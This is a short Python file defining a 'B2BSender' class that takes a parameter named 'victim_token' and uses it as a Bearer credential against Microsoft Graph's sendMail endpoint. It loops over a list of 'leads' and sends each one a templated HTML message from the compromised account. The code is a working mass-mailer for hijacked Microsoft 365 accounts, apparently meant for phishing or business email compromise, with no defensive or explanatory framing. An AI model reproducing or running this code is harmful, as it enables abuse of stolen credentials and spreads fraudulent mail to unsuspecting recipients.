import requests

class B2BSender:
    @staticmethod
    def send_batch(leads, subject_template, body_template, victim_token):
        results = []
        headers = {"Authorization": f"Bearer {victim_token}"}
        url = "https://graph.microsoft.com/v1.0/me/sendMail"
        for lead in leads:
            subject = subject_template.replace('{{target}}', lead.target_email)
            body = body_template.replace('{{target}}', lead.target_email)
            payload = {
                "message": {
                    "subject": subject,
                    "body": {"contentType": "HTML", "content": body},
                    "toRecipients": [{"emailAddress": {"address": lead.target_email}}]
                },
                "saveToSentItems": "true"
            }
            resp = requests.post(url, headers=headers, json=payload)
            results.append({
                'email': lead.target_email,
                'success': resp.status_code == 202
            })
        return results 
